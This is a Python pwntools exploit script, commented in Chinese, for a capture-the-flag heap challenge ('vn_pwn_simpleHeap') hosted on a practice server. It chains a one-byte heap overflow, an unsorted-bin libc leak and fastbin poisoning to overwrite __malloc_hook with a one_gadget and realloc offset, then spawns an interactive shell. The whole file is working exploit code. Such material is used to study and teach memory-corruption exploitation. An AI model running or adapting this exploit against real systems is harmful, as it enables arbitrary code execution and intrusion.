from pwn import *
from LibcSearcher import LibcSearcher
import sys

io = -1
############################
#********修改文件名**********
############################
file_name = 'vn_pwn_simpleHeap'
port = 27117

###########修改宏###########
DEBUG = 1
LOG_PRINT = 1
TMUX = 0
def LOG_ADDR_SUCCESS(name:str, addr:int):
    '''
    打印地址
    name: 变量名，str
    addr: 地址，int

    '''
    global LOG_PRINT
    if LOG_PRINT:
        log.success('{} ===> {}'.format(name, hex(addr)))

def LOG_SUCCESS(info):
    '''
    打印信息
    
    '''
    if LOG_PRINT:
        log.success(info)

def Get_Str_Addr(target_addr:str):
    """
    获取字符串的地址

    """
    global io
    return io.search(target_addr.encode()).__next__()

if DEBUG: # 本地打
    io = process('./{}'.format(file_name))
    def STOP(idx:str = 0):
        input('stop{} ===> {}'.format(idx, proc.pidof(io)))
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io, gdbscript='b *0x80485FC\nc\n')
else: # 远程打
    io = remote('node3.buuoj.cn', port)

io_elf = ELF('./{}'.format(file_name))
log.success("libc used ===> {}".format(io_elf.libs))
context.log_level = 'debug'

##########################下面为攻击代码#######################
##########################下面为攻击代码#######################
'''
堆溢出
'''
count = -1

def Add(size:int, content:bytes=b'\x00'):
    assert size < 112 and size > 0, "error!"
    global io
    io.sendafter("choice: ", b'1')
    io.sendafter("size?", str(size).encode())
    io.sendafter("content:", content)
    io.recvuntil("Done!\n")
    global count
    count += 1
    return count

def Edit(idx:int, content):
    assert idx < 9 and idx >= 0, 'error!'
    global io
    io.sendafter("choice: ", b'2')
    io.sendafter("idx?", str(idx).encode())
    io.sendafter("content:", content)
    io.recvuntil("Done!\n")

def Show(idx:int):
    assert idx < 9 and idx >= 0, 'error!'
    global io
    io.sendafter("choice: ", b'3')
    io.sendafter("idx?", str(idx).encode())
    return io.recvuntil("Done!\n")

def Delete(idx:int):
    assert idx < 9 and idx >= 0, 'error!'
    global io
    io.sendafter("choice: ", b'4')
    io.sendafter("idx?", str(idx).encode())
    io.recvuntil("Done!\n")


ie = Add(0x18)
ic = Add(0x18)
ia = Add(0x18)
ib = Add(0x60, b'\x00' * 0x18 + p64(0x51))
Add(0x10)
Add(0x10)

# 修改ib
Edit(ia, 0x18 * b'\x00' + b'\x91')
Delete(ib)
Add(0x60)

msg = Show(4)  # 可以得到libc的基地址

leak_addr = u64(msg[:6].ljust(8, b'\x00'))
LOG_ADDR_SUCCESS('leak_addr', leak_addr)
libc_base = leak_addr - 0x3c4b78
LOG_ADDR_SUCCESS('libc_base', libc_base)
target = leak_addr - 0x88 - 3

Add(0x18) # 把unsortedbin 最后一块malloc出来

# Edit(2, p64(0) * 3 + p64(0x71) + p64(0) + b'\n')
# Delete(3)
# Add(0x60)

Edit(1, 0x18 * b'\x00' + b'\x41')
Delete(2)

Add(0x30)

Delete(3)
Edit(2, p64(0) * 3 + p64(0x71) + p64(target) + b'\n')

realloc_addr = 0x84710 # 这是本机的realloc的偏移


Add(0x60)
gadget = [0x45226, 0x4527a, 0xf0364, 0xf1207, 0x4526a]
one_g = libc_base + gadget[1]
LOG_ADDR_SUCCESS('one_g', one_g)
Add(0x60, b'c' * (0x13-8) + p64(one_g) + p64(libc_base + realloc_addr + 0xd)+ b'\n')

io.sendafter("choice: ", b'1')
io.sendafter("size?", str(16).encode())

io.interactive()
